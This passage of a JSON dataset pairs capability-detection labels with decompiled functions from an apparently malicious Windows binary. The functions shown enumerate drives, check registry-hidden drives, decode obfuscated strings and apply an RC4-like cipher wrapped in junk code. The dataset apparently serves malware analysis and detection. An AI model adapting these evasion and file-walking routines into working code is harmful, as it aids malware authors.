            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00415c2e(int32_t arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    int32_t arg_8h_00;\n    int32_t arg_8h_01;\n    \n    uVar1 = fcn.0040a88f(0x419064, 4, 0x5219c080, 0);\n    pcVar2 = fcn.00415769(uVar1);\n    if (((pcVar2 != NULL) && (*pcVar2 == '{')) && (pcVar2 = fcn.0041578f(pcVar2),  pcVar2 != NULL)) {\n        if (*pcVar2 == '}') {\ncode_r0x00415d60:\n            uVar1 = fcn.0041578f(pcVar2);\n            return uVar1;\n        }\n        arg_8h_00 = fcn.00415755(arg_8h);\n        *(arg_8h + 0x10) = arg_8h_00;\n        if ((arg_8h_00 != 0) && (pcVar2 = fcn.00415896(arg_8h_00, pcVar2, arg_10h),  pcVar2 != NULL)) {\n            uVar1 = *(arg_8h_00 + 0x20);\n            *(arg_8h_00 + 0x20) = 0;\n            *(arg_8h_00 + 0x1c) = uVar1;\n            if (*pcVar2 == ':') {\n                *arg_10h = *arg_10h + -1;\n                if (((*arg_10h != 0) && (pcVar2 = fcn.00415d71(arg_8h_00, pcVar2 + 1, arg_10h),  pcVar2 != NULL)) &&\n                   (*arg_10h != 0)) {\n                    while (((*pcVar2 == ',' && (pcVar2 = fcn.0041578f(pcVar2),  pcVar2 != NULL)) &&\n                           (arg_8h_01 = fcn.00415755(arg_8h),  arg_8h_01 != 0))) {\n                        *(arg_8h_00 + 8) = arg_8h_01;\n                        *(arg_8h_01 + 0xc) = arg_8h_00;\n                        pcVar2 = fcn.00415896(arg_8h_01, pcVar2, arg_10h);\n                        if (pcVar2 == NULL) break;\n                        uVar1 = *(arg_8h_01 + 0x20);\n                        *(arg_8h_01 + 0x20) = 0;\n                        *(arg_8h_01 + 0x1c) = uVar1;\n                        if (*pcVar2 != ':') break;\n                        *arg_10h = *arg_10h + -1;\n                        if (*arg_10h == 0) {\n                            return 0;\n                        }\n                        pcVar2 = fcn.00415d71(arg_8h_01, pcVar2 + 1, arg_10h);\n                        if ((pcVar2 == NULL) || (arg_8h_00 = arg_8h_01,  *arg_10h == 0)) break;\n                    }\n                    if ((*arg_10h != 0) && ((pcVar2 != NULL && (*pcVar2 == '}')))) goto code_r0x00415d60;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 804
    },
    "004160c3": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004160c3(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    int32_t iStack20;\n    \n    iStack20 = param_1;\n    uStack28 = 0x416088;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    while( true ) {\n        iVar1 = *(param_1 + 8);\n        uVar2 = *(param_1 + 0xc);\n        if ((uVar2 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar2 <= param_2)))) break;\n        uStack24 = *(iVar1 + uVar2 * 0xc);\n        *(param_1 + 0xc) = uStack24;\n        if (*(iVar1 + 4 + uVar2 * 0xc) == 0) {\n            fcn.0041615f(0x101);\n            (**(iVar1 + 8 + uVar2 * 0xc))();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 281
    },
    "0041617d": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041617d(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t in_FS_OFFSET;\n    uint var_20h;\n    int16_t *var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    puVar3 = arg_8h;\n    puVar8 = arg_8h[2];\n    if ((puVar8 & 3) != 0) {\n        return 0;\n    }\n    var_4h = *(in_FS_OFFSET + 8);\n    if ((var_4h <= puVar8) && (puVar8 < *(in_FS_OFFSET + 4))) {\n        return 0;\n    }\n    puVar1 = arg_8h + 3;\n    if (*puVar1 == 0xffffffff) {\n        return 1;\n    }\n    uVar10 = 0;\n    arg_8h = NULL;\n    puVar4 = puVar8;\n    do {\n        if ((*puVar4 != 0xffffffff) && (uVar10 <= *puVar4)) {\n            return 0;\n        }\n        if (puVar4[1] != 0) {\n            arg_8h = arg_8h + 1;\n        }\n        uVar10 = uVar10 + 1;\n        puVar4 = puVar4 + 3;\n    } while (uVar10 <= *puVar1);\n    if ((arg_8h != NULL) && ((puVar1 = puVar3[-2],  puVar1 < var_4h || (puVar3 <= puVar1)))) {\n        return 0;\n    }\n    uVar10 = puVar8 & 0xfffff000;\n    iVar5 = 0;\n    if (0 < *0x41e828) {\n        do {\n            if (*(iVar5 * 4 + 0x41e830) == uVar10) {\n                if (iVar5 < 1) {\n                    return 1;\n                }\n                if (*0x41e870 != 0) {\n                    *0x41e870 = 1;\n                    return 1;\n                }\n                if (*(iVar5 * 4 + 0x41e830) == uVar10) goto code_r0x00416292;\n                iVar5 = *0x41e828 + -1;\n                if (-1 < iVar5) goto code_r0x0041626f;\n                goto code_r0x0041627f;\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < *0x41e828);\n    }\n    iVar6 = sub.ntdll.dll_NtQueryVirtualMemory(0xffffffff, puVar8, 0, &var_20h, 0x1c, &arg_8h);\n    iVar5 = *0x41e828;\n    if (iVar6 < 0) {\n        arg_8h = NULL;\n    }\n    if (arg_8h == NULL) {\n        return 0xffffffff;\n    }\n    if (var_8h != 0x1000000) {\n        return 0xffffffff;\n    }\n    if ((var_ch & 0xcc) != 0) {\n        if (((*var_1ch != 0x5a4d) || (piVar7 = *(var_1ch + 0x1e) + var_1ch,  *piVar7 != 0x4550)) ||\n           (*(piVar7 + 6) != 0x10b)) {\n            return 0xffffffff;\n        }\n        uVar9 = *(piVar7 + 5);\n        if (*(piVar7 + 6) == 0) {\n            return 0xffffffff;\n        }\n        uVar2 = *(piVar7 + uVar9 + 0x24);\n        if (((uVar2 <= puVar8 - var_1ch) && (puVar8 - var_1ch < *(piVar7 + uVar9 + 0x20) + uVar2)) &&\n           ((*(piVar7 + uVar9 + 0x3f) & 0x80) != 0)) {\n            return 0;\n        }\n    }\n    if (*0x41e870 != 0) {\n        *0x41e870 = 1;\n        return 1;\n    }\n    iVar6 = *0x41e828;\n    if (0 < *0x41e828) {\n        puVar8 = *0x41e828 * 4 + 0x41e82c;\n        do {\n            if (*puVar8 == uVar10) break;\n            iVar6 = iVar6 + -1;\n            puVar8 = puVar8 + -1;\n        } while (0 < iVar6);\n    }\n    if (iVar6 == 0) {\n        iVar6 = 0xf;\n        if (*0x41e828 < 0x10) {\n            iVar6 = *0x41e828;\n        }\n        iVar11 = 0;\n        if (-1 < iVar6) {\n            do {\n                puVar8 = iVar11 * 4 + 0x41e830;\n                uVar9 = *puVar8;\n                iVar11 = iVar11 + 1;\n                *puVar8 = uVar10;\n                uVar10 = uVar9;\n            } while (iVar11 <= iVar6);\n        }\n        if (iVar5 < 0x10) {\n            *0x41e828 = iVar5 + 1;\n        }\n    }\n    *0x41e870 = 0;\n    return 1;\n    while (iVar5 = iVar5 + -1,  -1 < iVar5) {\ncode_r0x0041626f:\n        if (*(iVar5 * 4 + 0x41e830) == uVar10) break;\n    }\n    if (iVar5 < 0) {\ncode_r0x0041627f:\n        if (*0x41e828 < 0x10) {\n            *0x41e828 = *0x41e828 + 1;\n        }\n        iVar5 = *0x41e828 + -1;\n    }\n    else if (iVar5 == 0) {\n        *0x41e870 = 0;\n        return 1;\n    }\ncode_r0x00416292:\n    iVar6 = 0;\n    if (-1 < iVar5) {\n        do {\n            puVar8 = iVar6 * 4 + 0x41e830;\n            uVar9 = *puVar8;\n            iVar6 = iVar6 + 1;\n            *puVar8 = uVar10;\n            uVar10 = uVar9;\n        } while (iVar6 <= iVar5);\n    }\n    *0x41e870 = 0;\n    return 1;\n}\n",
        "token_count": 1600
    },
    "004028b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.004028b0(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0, 3, 0, 3, 0, 0);\n    if (iVar1 != -1) {\n        fcn.0040c13c();\n        return 1;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((iVar1 != 3) && (iVar1 != 2)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 134
    },
    "00402c29": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.00402c29(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    code *var_ch;\n    code *var_8h;\n    code *var_4h;\n    \n    var_ch = fcn.0040313f;\n    var_8h = fcn.00402af1;\n    var_4h = fcn.004028ed;\n    (*_sym.imp.KERNEL32.dll_SetErrorMode)(0x8000);\n    uVar2 = 0;\n    do {\n        cVar1 = (*(&var_ch)[uVar2])();\n        if (cVar1 != '\\0') {\n            return 1;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 < 3);\n    return 0;\n}\n",
        "token_count": 179
    },
    "00404eb6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00404eb6(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    var_ch = 0;\n    do {\n        if (var_1h != 0) break;\n        var_8h = NULL;\n        in_EAX = (**(unaff_EDI + 0x134))(arg_8h, 0, unaff_EDI + 0x170, &var_8h);\n        if ((-1 < in_EAX) && (var_8h != NULL)) {\n            iVar1 = (**(*unaff_ESI + 0x50))();\n            if (-1 < iVar1) {\n                iVar1 = (**(*unaff_ESI + 0x54))();\n                var_1h._0_1_ = -1 < iVar1;\n            }\n            in_EAX = (**(*var_8h + 8))(var_8h);\n        }\n        var_ch = var_ch + 1;\n    } while (var_ch < 2);\n    return in_EAX & 0xffffff00 | var_1h;\n}\n",
        "token_count": 336
    },
    "00404f23": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00404f23(uint arg_8h)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    var_ch = 0;\n    do {\n        if (var_1h != 0) break;\n        var_8h = NULL;\n        in_EAX = (**(unaff_EDI + 0x134))(arg_8h, 0, unaff_EDI + 0x170, &var_8h);\n        if ((-1 < in_EAX) && (var_8h != NULL)) {\n            iVar1 = (**(*unaff_ESI + 0x48))();\n            if (-1 < iVar1) {\n                iVar1 = (**(*unaff_ESI + 0x54))();\n                var_1h._0_1_ = -1 < iVar1;\n            }\n            in_EAX = (**(*var_8h + 8))(var_8h);\n        }\n        var_ch = var_ch + 1;\n    } while (var_ch < 2);\n    return in_EAX & 0xffffff00 | var_1h;\n}\n",
        "token_count": 332
    },
    "00404f8a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00404f8a(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    var_10h = 0;\n    do {\n        if (var_1h != 0) break;\n        var_ch = NULL;\n        in_EAX = (**(unaff_ESI + 0x134))(arg_ch, 0, unaff_ESI + 0x170, &var_ch);\n        if ((-1 < in_EAX) && (var_ch != NULL)) {\n            var_8h = NULL;\n            iVar1 = (**(unaff_ESI + 0x134))(arg_10h, 0, unaff_ESI + 0x170, &var_8h);\n            if ((-1 < iVar1) && (var_8h != NULL)) {\n                iVar1 = (**(*arg_8h + 0x40))(arg_8h, var_ch, var_8h, 0, 0);\n                if (-1 < iVar1) {\n                    iVar1 = (**(*arg_8h + 0x54))(arg_8h);\n                    var_1h._0_1_ = -1 < iVar1;\n                }\n                (**(*var_8h + 8))(var_8h);\n            }\n            in_EAX = (**(*var_ch + 8))(var_ch);\n        }\n        var_10h = var_10h + 1;\n    } while (var_10h < 2);\n    return in_EAX & 0xffffff00 | var_1h;\n}\n",
        "token_count": 449
    },
    "0040501e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040501e(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    var_10h = 0;\n    do {\n        if (var_1h != 0) break;\n        var_ch = NULL;\n        in_EAX = (**(unaff_ESI + 0x134))(arg_ch, 0, unaff_ESI + 0x170, &var_ch);\n        if ((-1 < in_EAX) && (var_ch != NULL)) {\n            var_8h = NULL;\n            iVar1 = (**(unaff_ESI + 0x134))(arg_10h, 0, unaff_ESI + 0x170, &var_8h);\n            if ((-1 < iVar1) && (var_8h != NULL)) {\n                iVar1 = (**(*arg_8h + 0x38))(arg_8h, var_ch, var_8h, arg_14h, 0);\n                if (-1 < iVar1) {\n                    iVar1 = (**(*arg_8h + 0x54))(arg_8h);\n                    var_1h._0_1_ = -1 < iVar1;\n                }\n                (**(*var_8h + 8))(var_8h);\n            }\n            in_EAX = (**(*var_ch + 8))(var_ch);\n        }\n        var_10h = var_10h + 1;\n    } while (var_10h < 2);\n    return in_EAX & 0xffffff00 | var_1h;\n}\n",
        "token_count": 456
    },
    "00407be8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00407be8(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_120h;\n    uint32_t var_11ch;\n    int32_t var_118h;\n    int32_t var_110h;\n    uint var_8h;\n    \n    if (*0x41bb44 == -1) {\n        *0x41bb44 = 0;\n        sub.ntdll.dll_memset(&var_11ch, 0, 0x118);\n        fcn.0040f255();\n        if ((var_110h == 2) && (4 < var_11ch)) {\n            if (var_11ch < 6) {\n                if (var_11ch == 5) {\n                    if (var_118h == 2) {\n                        iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x59);\n                        if ((((iVar2 != 0) || (var_8h == 0x2000)) || (var_8h._2_1_ != '\\x01')) ||\n                           (iVar2 = fcn.0040c40d(),  iVar2 == 0)) {\n                            *0x41bb44 = 1;\n                            return 1;\n                        }\n                    }\n                    else if (var_118h != 1) {\n                        return *0x41bb44;\n                    }\n                    *0x41bb44 = 5;\n                }\n            }\n            else if (var_11ch == 10) {\n                *0x41bb44 = 10;\n            }\n            else if (var_118h == 0) {\n                *0x41bb44 = (var_8h._2_1_ == '\\x01') * 4 + 2;\n            }\n            else if (var_118h == 1) {\n                *0x41bb44 = ((var_8h._2_1_ != '\\x01') - 1 & 5) + 2;\n            }\n            else {\n                if (var_118h == 2) {\n                    uVar1 = (var_8h._2_1_ != '\\x01') - 1 & 5;\n                }\n                else {\n                    if (var_118h != 3) {\n                        return *0x41bb44;\n                    }\n                    uVar1 = (var_8h._2_1_ != '\\x01') - 1 & 6;\n                }\n                *0x41bb44 = uVar1 + 3;\n            }\n        }\n    }\n    return *0x41bb44;\n}\n",
        "token_count": 581
    },
    "0040982e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040982e(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    int64_t iVar4;\n    uint var_138h;\n    uint s;\n    uint var_1eh;\n    uint var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t lpString2;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.0040a88f(0x418acc, 10, 0xe78d7e58, 0);\n    iVar2 = fcn.00415506(uVar1);\n    if (iVar2 != 0) {\n        uVar1 = fcn.0040a88f(0x418ad8, 0xc, 0x5bc350e8, 0);\n        fcn.00415506(uVar1);\n        *0x41e168 = fcn.004155c2();\n        uVar1 = fcn.0040a88f(0x418ae8, 10, 0x136b2288, 0);\n        fcn.00415506(uVar1);\n        var_18h = fcn.00415629();\n        uVar1 = fcn.0040a88f(0x418af4, 5, 0x278cf954, 0);\n        var_10h = fcn.00415506(uVar1);\n        if (var_10h != 0) {\n            var_14h = fcn.004154a9();\n            var_4h = 0;\n            if (var_14h != 0) {\n                do {\n                    iVar2 = fcn.004154d0(var_4h);\n                    if (iVar2 != 0) {\n                        uVar1 = fcn.0040a88f(0x418afc, 0xe, 0x3c4bd9bc, 0);\n                        fcn.00415506(uVar1);\n                        lpString2 = fcn.00415629();\n                        if (lpString2 != 0) {\n                            uVar1 = fcn.0040a88f(0x418b0c, 9, 0xf5d17e22, 0);\n                            fcn.00415506(uVar1);\n                            iVar2 = fcn.00415629();\n                            if (iVar2 != 0) {\n                                var_ch = 0;\n                                uVar1 = fcn.0040a88f(0x418b18, 6, 0x7b8076ff, 0);\n                                fcn.00415506(uVar1);\n                                iVar4 = fcn.004155c2();\n                                if (iVar4 != 0) {\n                                    iVar2 = fcn.0040f021(iVar2, 0);\n                                    var_ch = iVar2;\n                                    if (iVar2 == 0) goto code_r0x00409a69;\n                                }\n                                uVar1 = fcn.0040a88f(0x418b20, 4, 0x6fa0c8f7, 0);\n                                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(uVar1, lpString2);\n                                if (iVar3 == 0) {\n                                    sub.ntdll.dll_memset(&s, 0, 0x118);\n                                    iVar3 = fcn.0040f255();\n                                    if ((iVar3 != 0) && (var_1eh == '\\x03')) goto code_r0x00409a69;\n                                }\n                                iVar3 = fcn.0040ae05(0);\n                                uVar1 = var_18h;\n                                arg_8h_00 = fcn.0040acd8(0x418b28, 4, 0xc251bf36, var_18h, lpString2);\n                                fcn.0040beef(arg_8h_00, uVar1);\n                                uVar1 = fcn.00407d6d(arg_8h, iVar2, iVar3 + 8);\n                                *(iVar3 + 4) = uVar1;\n                                *0x41df4c = fcn.0040ae72();\n                                iVar2 = *0x41df5c;\n                                *0x41df5c = *0x41df5c + 1;\n                                *(*0x41df4c + iVar2 * 4) = iVar3;\n                                fcn.0040af12();\n                            }\n                        }\n                    }\ncode_r0x00409a69:\n                    var_4h = var_4h + 1;\n                } while (var_4h < var_14h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1083
    },
    "00409e0e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.00409e0e(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint hKey;\n    uint32_t var_4h;\n    \n    var_10h = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    uVar3 = 0;\n    var_18h = 0x80000002;\n    var_14h = 0x80000001;\n    uVar4 = 0;\n    uVar1 = extraout_ECX;\n    do {\n        uVar1 = fcn.0040acd8(0x418b70, 0x3b, 0x2b8bbf62, uVar1, 0, 0x20019, &hKey);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)((&var_18h)[uVar4], uVar1);\n        uVar1 = extraout_ECX_00;\n        if (iVar2 == 0) {\n            var_4h = 0;\n            var_ch = 4;\n            uVar1 = fcn.0040acd8(0x418bac, 8, 0x82d43e69, 0, 0, &var_4h, &var_ch);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, uVar1);\n            if ((iVar2 == 0) && (var_4h != 0)) {\n                uVar3 = uVar3 | var_4h;\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar1 = extraout_ECX_01;\n        }\n        uVar4 = uVar4 + 1;\n    } while (uVar4 < 2);\n    return ~uVar3 & var_10h;\n}\n",
        "token_count": 484
    },
    "00409ebb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00409ebb(uint lpRootPathName)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    uint lpTargetPath;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(lpRootPathName);\n    if ((1 < uVar1) && ((uVar1 < 4 || (uVar1 == 6)))) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_QueryDosDeviceW)(lpRootPathName, &lpTargetPath, 0x208);\n        if (iVar2 != 0) {\n            uVar3 = fcn.0040acd8(0x418bb8, 4, 0xe92a9ff5, extraout_ECX, 4);\n            iVar2 = (*_sym.imp.SHLWAPI.dll_StrCmpNW)(&lpTargetPath, uVar3);\n            if (iVar2 == 0) {\n                uVar1 = 1;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 243
    },
    "0040a4b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a4b6(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint lpSystemInfo;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t lpAddress;\n    int32_t var_10h;\n    uint var_ch;\n    ushort var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0, 0, 0, 0x41df60);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(0x41df60, 0x418bc4);\n    *0x41de24 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x41df60);\n    var_1ch = 0;\n    var_18h = 0;\n    lpAddress = 0;\n    var_10h = 0;\n    lpAddress = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x1fffffff, 0x2000, 4);\n    if (lpAddress != 0) {\n        var_10h = lpAddress;\n        fcn.0040c920(&var_4h);\n        (*_sym.imp.KERNEL32.dll_GetNativeSystemInfo)(&lpSystemInfo);\n        var_1ch = var_24h;\n        uVar1 = fcn.00409e0e();\n        iVar3 = 0;\n        do {\n            if ((uVar1 & 1 << (iVar3 & 0x1f)) != 0) {\n                var_ch._0_2_ = iVar3 + 0x41;\n                var_ch._2_2_ = 0x3a;\n                var_8h = 0;\n                uVar2 = fcn.00409ebb(&var_ch);\n                if ((1 < uVar2) && ((uVar2 < 4 || (uVar2 == 6)))) {\n                    fcn.0040a1f2(&var_ch, &var_1ch);\n                }\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x1a);\n        if (*0x41c697 != '\\0') {\n            fcn.00409f29(0, fcn.0040a1f2, &var_1ch);\n        }\n        fcn.0040a317(var_10h - lpAddress >> 4, arg_8h, arg_ch);\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(lpAddress, 0, 0x8000);\n    }\n    return;\n}\n",
        "token_count": 614
    },
    "0040b5b8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b5b8(int32_t arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    bool bVar2;\n    int16_t iVar3;\n    uint16_t uVar4;\n    int32_t extraout_EDX;\n    uint8_t uVar5;\n    int32_t unaff_ESI;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    bool bVar9;\n    bool bVar10;\n    ulong uVar11;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint8_t *var_8h;\n    uint8_t var_2h;\n    uint var_1h;\n    \n    uVar5 = *0x41b036;\n    uVar6 = *0x41e3fd;\n    iVar3 = fcn.0040b186(*0x41b036);\n    uVar7 = uVar6 * var_10h ^ iVar3 * 0xd0;\n    var_1h._0_1_ = *(unaff_ESI + 0x100);\n    fcn.0040b186(0x7d);\n    var_2h = *(unaff_ESI + 0x101);\n    uVar6 = fcn.0040b261(0x70);\n    *0x41e3fd = ((uVar6 & 0xffff) + *0x41e3fd != 0 | *0x41b13c + 0xc9U) != 0;\n    if (arg_10h != 0) {\n        var_8h = arg_ch;\n        var_ch = arg_10h;\n        do {\n            fcn.0040b261(uVar5);\n            uVar11 = fcn.0040afe7();\n            if ((uVar11 >> 0x20 <= uVar11 * 0xfe) || (uVar4 = fcn.0040b186(0x35),  *0x41e3fd <= (uVar4 | 0xcc))) {\n                uVar6 = 0;\n                iVar8 = 0;\n                do {\n                    do {\n                        *0x41e3fd = *0x41e3fd << (*0x41b604 & 0x1f) != 0;\n                        bVar9 = 0xfffffffe < uVar6;\n                        uVar6 = uVar6 + 1;\n                        bVar10 = SCARRY4(iVar8, 0);\n                        bVar2 = SCARRY4(iVar8, bVar9);\n                        iVar8 = iVar8 + bVar9;\n                    } while (iVar8 < 0);\n                } while ((iVar8 == 0 || (bVar10 != bVar2) != iVar8 < 0) && (uVar6 < 3));\n            }\n            var_1h._0_1_ = var_1h + 1;\n            cVar1 = *(var_1h + unaff_ESI);\n            var_2h = var_2h + cVar1;\n            *0x41e3fd = (*0x41b13c - 0x9dU != *0x41e3fd) - *0x41b13c != -0xdc;\n            uVar6 = var_2h;\n            *(var_1h + unaff_ESI) = *(uVar6 + unaff_ESI);\n            *(uVar6 + unaff_ESI) = cVar1;\n            fcn.0040afe7();\n            *var_8h = *((*(uVar6 + unaff_ESI) + *(extraout_EDX + unaff_ESI) & 0xff) + unaff_ESI) ^\n                      var_8h[arg_8h - arg_ch];\n            uVar5 = *0x41b036;\n            uVar4 = fcn.0040b186(*0x41b036);\n            *0x41e3fd = uVar4 != *0x41e3fd;\n            var_8h = var_8h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    if ((*0x41e3fd < uVar7) || (uVar6 = fcn.0040b261(uVar5),  (uVar6 & 0xffff) < uVar7)) {\n        